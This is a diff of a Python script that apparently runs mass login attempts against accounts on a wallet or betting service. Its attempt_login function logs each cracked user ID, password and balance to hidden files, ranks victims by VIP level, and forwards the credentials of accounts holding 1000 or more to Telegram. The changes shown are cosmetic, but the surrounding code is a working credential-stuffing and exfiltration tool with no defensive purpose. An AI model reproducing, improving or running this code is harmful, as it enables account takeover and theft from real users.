@@ -30,14 +30,17 @@ def show_logo():
     print(COLORS[-1] + BOLD + subtitle.center(width) + RESET + '\n')
 
 def get_balance_deep(data):
-    """Deep check for balance in various keys"""
+    """Deep check for balance"""
     try:
+        # 1. totalMainProviderBalance
         if 'totalMainProviderBalance' in data and data['totalMainProviderBalance'] is not None:
             return data['totalMainProviderBalance']
         
+        # 2. mainWallet
         if 'mainWallet' in data and data['mainWallet'] is not None:
             return data['mainWallet']
         
+        # 3. Check specific balance keys
         balance_keys = ['balance', 'mainBalance', 'totalBalance', 'availableBalance', 
                        'walletBalance', 'currentBalance', 'totalAvailableBalance']
         
@@ -45,6 +48,7 @@ def get_balance_deep(data):
             if key in data and data[key] is not None:
                 return data[key]
         
+        # 4. Check nested member/wallet objects
         if 'member' in data and isinstance(data['member'], dict):
             if 'mainWallet' in data['member'] and data['member']['mainWallet'] is not None:
                 return data['member']['mainWallet']
@@ -60,7 +64,7 @@ def get_balance_deep(data):
         return 0
 
 def get_balance_value(balance):
-    """Extract numeric value from balance string/int"""
+    """Extract numeric value"""
     try:
         if isinstance(balance, (int, float)):
             return float(balance)
@@ -103,25 +107,23 @@ def attempt_login(user_id, pw):
                 data = res.get('data', {})
                 
                 balance = get_balance_deep(data)
-                # Default rank is 'Normal' if not found
                 level = data.get('vipInfo', {}).get('nowVipName', 'Normal')
                 uid = data.get('userId', user_id)
 
                 with lock: successful_users.add(user_id)
                 
-                # UPDATE: Logic changed here
-                # Bronze and Normal -> .normal.txt
+                # --- RANKING LOGIC (ORIGINAL + FIX) ---
+                # Bronze or Normal -> .normal.txt
                 # Anything else -> .high.txt
                 is_high = level not in ['Normal', 'Bronze']
                 
                 filename = '.high.txt' if is_high else '.normal.txt'
                 color = G if is_high else Y
-                status = 'High' if is_high else 'Normal'
+                status = 'Good' if is_high else 'Poor'
                 earn = '2 BDT' if is_high else '1 BDT'
 
                 bal_val = get_balance_value(balance)
                 
-                # Telegram Notification Logic
                 if bal_val >= 1000:
                     send_telegram(uid, pw, balance, level)
                     if bal_val >= 10000: 
@@ -131,7 +133,8 @@ def attempt_login(user_id, pw):
                         earn = '50 BDT'
                         color = G
 
-                print(f'{BOLD}{color} {uid} | Rank : {level} | Earned : {earn} {D}')
+                # Reverted to Original Print Style
+                print(f'{BOLD}{color} {uid} | Profile : {status} | Earned : {earn} {D}')
 
                 with open(filename, 'a', encoding='utf-8') as f:
                     f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
@@ -180,4 +183,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
